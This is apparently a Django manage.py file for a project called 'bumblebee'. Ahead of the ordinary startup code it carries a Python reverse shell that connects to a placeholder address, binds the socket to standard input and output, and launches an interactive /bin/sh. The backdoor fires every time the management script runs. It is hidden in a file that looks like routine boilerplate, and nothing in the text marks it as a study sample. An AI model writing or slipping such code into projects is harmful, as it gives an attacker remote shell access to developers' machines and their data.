#!/usr/bin/env python
import os
import sys
import socket,subprocess,os

if __name__ == '__main__':
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("ip_addr",'port'))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])

    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'bumblebee.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)



